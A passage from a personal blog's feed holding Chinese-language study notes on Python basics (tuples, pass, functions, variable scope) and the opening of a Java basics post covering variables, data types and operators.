class="comment">#逆转</span></span><br><span class="line"><span class="built_in">print</span>(second_list)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#[1, 3, 13, 13, 23]</span></span><br><span class="line"><span class="comment">#[23, 13, 13, 3, 1]</span></span><br></pre></td></tr></table></figure><h3 id="列表理解：创建新列表的优雅方式"><a href="#列表理解：创建新列表的优雅方式" class="headerlink" title="列表理解：创建新列表的优雅方式"></a>列表理解：创建新列表的优雅方式</h3><p>列表理解是从Python现有列表中创建新列表的一种简洁明了的方法。</p><p>列表理解包含一个表达式，后跟方括号内的<a href="https://www.cainiaoplus.com/python/python-for-loop.html">for语句</a>。</p><p>这是一个列出每项增加2的幂的示例。</p><h2 id="Python-元组（Tuple）"><a href="#Python-元组（Tuple）" class="headerlink" title="Python 元组（Tuple）"></a>Python 元组（Tuple）</h2><h3 id="创建一个元组"><a href="#创建一个元组" class="headerlink" title="创建一个元组"></a>创建一个元组</h3><p>通过将所有项目（元素）放在括号内()（以逗号分隔）来创建元组。括号是可选的，但是，使用括号是一个好习惯。</p><p>元组可以具有任意数量的项，并且它们可以具有不同的类型（整数，浮点数，列表，<a href="https://www.cainiaoplus.com/python/python-string.html">字符串</a>等）。</p><p>也可以在不使用括号的情况下创建元组。这称为元组包装。</p><p>用一个元素创建一个元组有点特殊。</p><p><strong>只有一个元素的元组，括号内仅包含一个元素是不够的。我们将需要一个逗号结尾来表明它实际上是一个元组。</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;Gu0f3n&quot;</span>)<span class="comment">#创建一个元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))<span class="comment">#打印元组内容</span></span><br><span class="line">my_tuple=(<span class="string">&quot;Gu0f3n&quot;</span>,)<span class="comment">#创建只有一个元素的元组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))</span><br><span class="line">my_tuple=<span class="string">&quot;Guof3n&quot;</span>,<span class="comment">#不适用括号进行元组包装（括号可选）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(my_tuple))</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"><span class="comment">#&lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="访问元组元素"><a href="#访问元组元素" class="headerlink" title="访问元组元素"></a>访问元组元素</h3><p>我们可以通过多种方式访问元组的元素。</p><p>1.索引</p><p>我们可以使用索引运算符[]访问索引从0开始的元组中的项目。</p><p>因此，具有6个元素的元组将具有从0到5的索引。尝试访问元组之外的元素（例如6、7 …）将引发IndexError。</p><p>索引必须是整数；因此我们不能使用float或其他类型。如果使用会导致TypeError。</p><p>同样，使用嵌套索引访问嵌套元组，如下面的示例所示。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple =(<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># IndexError:列表索引超出范围</span></span><br><span class="line"><span class="comment"># print(my_tuple[6])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 索引必须是整数</span></span><br><span class="line"><span class="comment"># TypeError: 列表索引必须是整数，而不是浮点数</span></span><br><span class="line"><span class="comment"># my_tuple[2.0]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#嵌套元组</span></span><br><span class="line">n_tuple=(<span class="string">&quot;Guof3n&quot;</span>,[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>],(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(n_tuple[<span class="number">0</span>][<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(n_tuple[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line"><span class="comment">#3</span></span><br><span class="line"><span class="comment">#2</span></span><br></pre></td></tr></table></figure><p>2.负索引</p><p>Python允许对其序列进行负索引。</p><p>索引-1表示最后一项，-2表示倒数第二项，依此类推。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;G&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;0&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">1</span>])<span class="comment">#n</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[-<span class="number">5</span>])<span class="comment">#u</span></span><br></pre></td></tr></table></figure><p>3.切片</p><p>我们可以使用切片运算符-冒号“：”访问元组中的一系列项目。</p><p>和列表差不太多【）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_tuple=(<span class="string">&quot;G&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;f&quot;</span>,<span class="string">&quot;3&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">1</span>:<span class="number">5</span>])<span class="comment">#(&#x27;u&#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:<span class="number">2</span>])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:-<span class="number">7</span>])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[<span class="number">2</span>:])<span class="comment">#(&#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6)</span></span><br><span class="line"><span class="built_in">print</span>(my_tuple[:])<span class="comment">#(&#x27;G&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;, 6, 6, 6)</span></span><br></pre></td></tr></table></figure><p>通过考虑索引位于元素之间，可以最好地可视化切片，如下所示。因此，如果要访问范围，则需要将元组中的部分切片的索引。</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732086569792.png"></p><p>后面一些类型像字典 元组和列表都大差不差 所以这章先到这里</p><h1 id="Python-pass-语句"><a href="#Python-pass-语句" class="headerlink" title="Python pass 语句"></a>Python pass 语句</h1><p>在本文中，您将学习pass语句。 它用作在后面实现函数，循环等的占位符。</p><h2 id="什么是Python中的pass语句？"><a href="#什么是Python中的pass语句？" class="headerlink" title="什么是Python中的pass语句？"></a>什么是Python中的pass语句？</h2><p>在Python编程中，pass语句为空语句。在Python中，<a href="https://www.cainiaoplus.com/python/python-statement-indentation-comments.html">注释</a>和pass语句之间的区别在于，尽管解释器完全忽略注释，而pass不会被忽略。</p><p>但是，执行传递时没有任何反应。结果为无操作（NOP）。</p><h3 id="pass语法"><a href="#pass语法" class="headerlink" title="pass语法"></a>pass语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure><p>我们通常将其用作占位符。</p><p>假设我们有一个尚未实现的<a href="https://www.cainiaoplus.com/python/python-for-loop.html">循环</a>或<a href="https://www.cainiaoplus.com/python/python-function.html">函数</a>，但我们想在将来执行实现它。他们不能有一个空的主体，解释器将给出错误。因此，我们使用该pass语句构造一个不执行任何操作的主体。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;pass只是一个占位符，</span><br><span class="line">用于以后添加功能。&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h1 id="Python-函数"><a href="#Python-函数" class="headerlink" title="Python 函数"></a>Python 函数</h1><p>在本文中，您将了解函数、函数是什么、函数的语法、构成和类型。另外，您还将学习如何用Python创建函数。</p><h2 id="Python中的函数是什么？"><a href="#Python中的函数是什么？" class="headerlink" title="Python中的函数是什么？"></a>Python中的函数是什么？</h2><p>在Python中，函数是一组执行特定任务的相关语句。</p><p>函数有助于将我们的程序分解为<strong>较小的模块</strong>。随着我们的项目越来越大，函数使其变得更加有组织和易于管理。</p><p>此外，它避免了重复写相同的代码，函数使代码可重复使用。</p><h3 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">function_name</span>(<span class="params">parameters</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;docstring&quot;&quot;&quot;</span></span><br><span class="line">statement(s)</span><br></pre></td></tr></table></figure><p>上面显示的是由以下组件组成的函数定义。</p><ol><li>def标记函数头开始的关键字。</li><li>用于唯一标识函数的函数名称。函数命名遵循<a href="https://www.cainiaoplus.com/python/python-keywords-identifier.html#rules">在Python中编写标识符</a>的相同<a href="https://www.cainiaoplus.com/python/python-keywords-identifier.html#rules">规则</a>。</li><li>通过其将值传递给函数的参数。它们是可选的。</li><li>冒号（:)标记函数头的结尾。</li><li>可选的文档字符串（docstring），用于描述函数的函数。</li><li>组成函数体的一个或多个有效python语句。语句必须具有相同的缩进级别（通常为4个空格）。</li><li>可选的return语句，用于从函数返回值。</li></ol><h3 id="函数示例"><a href="#函数示例" class="headerlink" title="函数示例"></a>函数示例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这是一个打招呼的函数，</span></span><br><span class="line"><span class="string">    通过name参数传递，</span></span><br><span class="line"><span class="string">    要打招呼的人名</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;. Good morning!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="如何在python中调用函数？"><a href="#如何在python中调用函数？" class="headerlink" title="如何在python中调用函数？"></a>如何在python中调用函数？</h3><p>定义函数后，我们可以从另一个函数，程序甚至Python提示符中调用它。要调用函数，我们只需键入带有适当参数的函数名称即可。</p><h2 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句"></a>return 语句</h2><p>return语句用于退出函数并返回到调用函数的位置。</p><h3 id="回语法"><a href="#回语法" class="headerlink" title="回语法"></a>回语法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [expression_list]</span><br></pre></td></tr></table></figure><p>该语句可以包含一个表达式，该表达式将被求值并返回值。如果该语句中没有表达式，或者return语句本身不存在于函数中，则该函数将返回None对象。</p><p><strong>例如：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(greet(<span class="string">&quot;May&quot;</span>))</span><br><span class="line">Hello, May. Good morning!</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>None是返回值，因为greet()函数直接打印名称，并且没有使用return语句。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">absolute_value</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;这个函数返回输入数字的绝对值&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(absolute_value(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(absolute_value(-<span class="number">4</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="Function如何在Python中工作？"><a href="#Function如何在Python中工作？" class="headerlink" title="Function如何在Python中工作？"></a>Function如何在Python中工作？</h2><p><img src="https://www.cainiaoplus.com/run/images/python-how-function-works_1.jpg" alt="函数如何在Python中工作？"></p><h2 id="变量的作用域和生命周期"><a href="#变量的作用域和生命周期" class="headerlink" title="变量的作用域和生命周期"></a>变量的作用域和生命周期</h2><p>变量的作用域是程序中可以识别该变量的部分。从函数外部看不到在函数内部定义的参数和变量。因此，它们具有本地作用域。</p><p>变量的生命周期是变量在内存中退出的时间。函数内部变量的生命周期与函数执行的时间一样长。</p><p>一旦我们从函数返回，它们就会被销毁。因此，函数无法记住其先前调用中的变量值。</p><p>这是一个示例，用于说明函数内部变量的生命周期。</p><p>示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def my_func():</span><br><span class="line">x = 10</span><br><span class="line">print(&quot;函数内部值:&quot;,x)</span><br><span class="line"></span><br><span class="line">x = 20</span><br><span class="line">my_func()</span><br><span class="line">print(&quot;函数外部值:&quot;,x)</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数内部值: 10</span><br><span class="line">函数外部值: 20</span><br></pre></td></tr></table></figure><p>在这里，我们可以看到x的初始值为20。即使函数my_func()将x的值更改为10，它也不会影响函数外部的值。</p><p>这是因为函数内部的变量x与函数外部的x变量不同。尽管它们具有相同的名称，<strong>但是它们是两个具有不同作用域的不同变量</strong>。</p><p>另一方面，从外部可以看到函数外部的变量。它们具有全局作用域，也就是函数内外部都可以使用该全局变量。</p><p>我们可以从函数内部读取这些值，但不能更改（写入）它们。如果要在函数外部修改变量的值，必须使用关键字global，将它们声明为全局变量。</p><h2 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h2><p>基本上，我们可以将函数分为以下两种类型：</p><ol><li><a href="https://www.cainiaoplus.com/python/python-methods-built-in.html">内置函数-Python内置的函数</a>。</li><li><a href="https://www.cainiaoplus.com/python/python-user-defined-function.html">用户定义的函数</a> -用户自己<a href="https://www.cainiaoplus.com/python/python-user-defined-function.html">定义的函数</a>。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Python是一种跨平台的编程语言，这意味着它可以在Windows，MacOS，Linux等多种平台上运行，甚至已经移植到Java和.NET虚拟机。它是免费和开源的。&lt;/p&gt;
&lt;p&gt;即使当今的大多数Linux和Mac已经预装了Python，但该版本可能已过时。因此，安装最新</summary>
      
    
    
    
    <category term="python" scheme="https://gu0f3n.github.io/categories/python/"/>
    
    
    <category term="python" scheme="https://gu0f3n.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>java基础</title>
    <link href="https://gu0f3n.github.io/2024/09/10/java%E5%9F%BA%E7%A1%80/"/>
    <id>https://gu0f3n.github.io/2024/09/10/java%E5%9F%BA%E7%A1%80/</id>
    <published>2024-09-10T01:45:52.000Z</published>
    <updated>2024-11-11T12:13:38.847Z</updated>
    
    <content type="html"><![CDATA[<p>1.安装jdk和IDEA</p><p>2.创建自己的第一个项目</p><p>3.编写自己的第一段代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello.world&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hello.world</span></span><br></pre></td></tr></table></figure><p>注释</p><p>单行注释 &#x2F; &#x2F;</p><p>多行注释&#x2F;**&#x2F;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n;</span><br><span class="line"><span class="comment">//这是我的第一段代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="comment">//main方法是程序的入口</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//在控制台上进行打印</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">随便打一些东西</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用快捷键：</span><br><span class="line">main方法快捷键：psvm+回车</span><br><span class="line">控制台原样输出：sout+回车</span><br><span class="line">删除一行：ctrl+y</span><br><span class="line">复制—行：ctrl+d</span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量的含义</p><p>变量本质上就是代表一个”可操作的存储空间”，空间位置是确定<br>的，但是里面放置什么值不确定。我们可通过变量名来访问“对应<br>的存储空间”，从而操纵这个“存储空间”存储的值。Java是一种<br>强类型语言，每个变量都必须声明其数据类型。变量的数据类型决<br>定了变量占据存储空间的大小。</p><p>变量的学习</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">步骤1：变量的声明</span><br><span class="line">type varName [=value][,varName[=value]...];</span><br><span class="line">注意：变量不可以重复定义</span><br><span class="line">步骤2：变量的赋值</span><br><span class="line">注意：变量的声明和赋值可以在同一行表示</span><br><span class="line">步骤3：变量的使用</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTvar</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.变量的声明（定义）</span></span><br><span class="line">        <span class="comment">//定义一个名字的变量</span></span><br><span class="line">        String name;<span class="comment">//定义一个变量为name，类型为string</span></span><br><span class="line">        <span class="comment">// 注意：变量不可重复定义</span></span><br><span class="line">        <span class="type">int</span> a,b;<span class="comment">//同时可以定义多个变量</span></span><br><span class="line">        name=<span class="string">&quot;Gu0f3n&quot;</span>;<span class="comment">//等号赋值</span></span><br><span class="line">        <span class="comment">//2.变量的赋值</span></span><br><span class="line">        <span class="type">int</span> age;</span><br><span class="line">        age=<span class="number">18</span>;<span class="comment">//等号赋值</span></span><br><span class="line">        age=<span class="number">32</span>;</span><br><span class="line">        age=<span class="number">40</span>+<span class="number">18</span>;</span><br><span class="line">        <span class="comment">//变量的定义和复制可以写在同一行</span></span><br><span class="line">        <span class="type">int</span> age1=<span class="number">19</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> e,f =<span class="number">30</span>;<span class="comment">//e没有赋值，f赋值30</span></span><br><span class="line">        <span class="comment">//变量的使用</span></span><br><span class="line">        System.out.println(age);<span class="comment">//使用变量的时候通过名字访问到空间中具体的值</span></span><br><span class="line">        <span class="type">int</span> g=<span class="number">20</span>;</span><br><span class="line">        System.out.println(age+g);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">控制台的打印结果</span></span><br><span class="line"><span class="comment">58</span></span><br><span class="line"><span class="comment">78</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型的分类</p><p>Java是一种强类型语言，每个变量都必须声明其数据类型<br>Java的数据类型可分为两大类：基本数据类型（primitivedata<br>type）和弓l用数据类型（reference data type）</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_19.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTtype</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//基本数据类型</span></span><br><span class="line">        <span class="comment">//1.整数类型</span></span><br><span class="line">        <span class="type">byte</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">10</span>;<span class="comment">//表述范围-128~127</span></span><br><span class="line">        <span class="type">short</span> <span class="variable">b</span> <span class="operator">=</span><span class="number">22000</span>;<span class="comment">//表述范围：正负三万</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span><span class="number">30123131</span>;<span class="comment">//正负21亿</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">d</span> <span class="operator">=</span><span class="number">401215151513131513L</span>;<span class="comment">//表述范围 很大 如果表示的数的范围超过intl类型范围就需要加L</span></span><br><span class="line">        <span class="comment">//2.浮点类型</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">e</span> <span class="operator">=</span><span class="number">3.14f</span>;<span class="comment">//如果float表示一个小数，后面必须加上f</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">f</span> <span class="operator">=</span><span class="number">4.56789</span>;</span><br><span class="line">        <span class="comment">//3.字符类型</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">g</span> <span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;<span class="comment">//单引号引起来的单个字符</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Gu0f3n&quot;</span>);<span class="comment">//后续的字符串</span></span><br><span class="line">        <span class="comment">//4.布尔类型</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span><span class="literal">true</span>;<span class="comment">//true and false</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_27.png" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.算数运算符</span></span><br><span class="line">        <span class="comment">//加号 1.表示正数2.相加 3.字符串拼接</span></span><br><span class="line">        System.out.println(+<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;输出一个数&quot;</span>+num);</span><br><span class="line">        System.out.println(<span class="string">&quot;abc&quot;</span>+<span class="number">5</span>+<span class="number">6</span>);</span><br><span class="line">        <span class="comment">//只要+左右两侧任意一侧是字符串，那么结果就是字符串</span></span><br><span class="line">        <span class="comment">//++自增</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span><span class="number">85</span>;</span><br><span class="line">        a++;</span><br><span class="line">        <span class="type">int</span> b=<span class="number">85</span>;</span><br><span class="line">        ++b;<span class="comment">//无论++放在变量前还是后都是+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> a++ + <span class="number">7</span>;<span class="comment">//如果++在变量的后面 先运算后加1，m=a+7 a+1</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(m);</span><br><span class="line">        a=<span class="number">5</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> ++a + <span class="number">7</span>;<span class="comment">//++在变量前，先加1，在运算，a=a+1,n=a+7</span></span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(n);</span><br><span class="line">    &#125;<span class="comment">//程序入口</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">10</span></span><br><span class="line"><span class="comment">11</span></span><br><span class="line"><span class="comment">输出一个数10</span></span><br><span class="line"><span class="comment">abc56</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">86</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">12</span></span><br><span class="line"><span class="comment">6</span></span><br><span class="line"><span class="comment">13</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTOPe2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//赋值运算符 =</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span><span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span><span class="number">20</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num3</span> <span class="operator">=</span><span class="number">10</span>+<span class="number">30</span>;</span><br><span class="line">        <span class="comment">//求和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        sum+=num1;</span><br><span class="line">        sum+=num2;<span class="comment">//sum=sum+num2;</span></span><br><span class="line">        sum+=num3;<span class="comment">//sum=sum+num3;</span></span><br><span class="line">        System.out.println(<span class="string">&quot;和：&quot;</span>+sum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#和：<span class="number">70</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTope3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//关系运算符==，最终结果是布尔值，不是true就是false</span></span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">6</span>);</span><br><span class="line">        System.out.println(<span class="number">5</span>==<span class="number">5</span>);</span><br><span class="line">        <span class="comment">//逻辑运算符：逻辑运算符左右连接的是布尔值</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//&amp;&amp;逻辑 都是ture 则为true 有一个false都为false</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>&amp;&amp;<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//||逻辑 如果都为false 结果都为false</span></span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="literal">false</span>||<span class="literal">false</span>);</span><br><span class="line">        System.out.println(<span class="literal">true</span>||<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">控制台结果：</span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作用：流程控制语句是用来控制程序中各语句执行顺序的语</span><br><span class="line">句，可以把语句组合成能完成一定功能的小逻辑模块</span><br></pre></td></tr></table></figure><p>分类</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_28.png"></p><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><p>if单分支</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_29.png" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif01</span> &#123;</span><br><span class="line">    <span 